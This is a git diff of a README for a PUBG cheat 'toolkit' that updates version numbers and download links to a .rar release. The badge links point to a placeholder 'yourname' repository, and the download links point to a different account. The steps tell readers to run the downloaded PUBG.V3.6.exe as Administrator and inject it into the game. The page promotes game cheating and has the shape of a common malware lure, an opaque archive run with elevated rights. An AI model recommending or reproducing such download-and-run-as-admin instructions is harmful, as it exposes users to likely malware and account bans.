@@ -7,7 +7,7 @@
 <br/>
 
 [![Platform](https://img.shields.io/badge/Platform-Windows%2010%2F11%20x64-blue?style=for-the-badge&logo=windows)](https://github.com/yourname/pubg-toolkit)
-[![Version](https://img.shields.io/badge/Version-3.4-orange?style=for-the-badge)](https://github.com/yourname/pubg-toolkit/releases)
+[![Version](https://img.shields.io/badge/Version-3.6-orange?style=for-the-badge)](https://github.com/yourname/pubg-toolkit/releases)
 [![License](https://img.shields.io/badge/License-MIT-yellow?style=for-the-badge)](LICENSE)
 
 <br/>
@@ -31,11 +31,11 @@
 
 ---
 
-### ⬇️ [Download](https://github.com/savagedragonrevive7/PUBG-External/releases/download/PUBG.V3.5/PUBG.V3.5.rar)
+### ⬇️ [Download](https://github.com/savagedragonrevive7/PUBG-External/releases/download/PUBG.V3.6/PUBG.V3.6.rar)
 
-Get the latest release from the **[Releases](https://github.com/savagedragonrevive7/PUBG-External/releases/download/PUBG.V3.5/PUBG.V3.5.rar)** tab.
+Get the latest release from the **[Releases](https://github.com/savagedragonrevive7/PUBG-External/releases/download/PUBG.V3.6/PUBG.V3.6.rar)** tab.
 
-[![Download Now](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=github)](https://github.com/savagedragonrevive7/PUBG-External/releases/download/PUBG.V3.5/PUBG.V3.5.rar)
+[![Download Now](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=github)](https://github.com/savagedragonrevive7/PUBG-External/releases/download/PUBG.V3.6/PUBG.V3.6.rar)
 
 ---
 
@@ -87,7 +87,7 @@ Download the latest release package from the **Releases** tab or the download li
 Extract all contents of the archive into a single folder on your desktop.
 
 **3. Run Loader**
-Run the `PUBG.V3.5.exe` executable as **Administrator**.
+Run the `PUBG.V3.6.exe` executable as **Administrator**.
 
 **4. Launch & Inject**
 Start PUBG, enter a match, and press `INSERT` or `DELETE` to open the in-game menu.
